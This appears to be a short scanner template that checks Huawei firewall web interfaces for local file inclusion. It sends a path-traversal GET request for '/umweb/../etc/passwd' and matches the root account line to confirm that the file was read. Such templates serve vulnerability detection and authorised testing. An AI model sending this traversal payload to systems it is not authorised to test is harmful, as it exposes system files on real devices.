id: poc-yaml-huawei-firewall-lfi

info:
  name: Huawei Firewall - Local File Inclusion
  author: taielab
  severity: high
  reference: https://github.com/taielab
  tags: lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/umweb/../etc/passwd"
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"
        part: body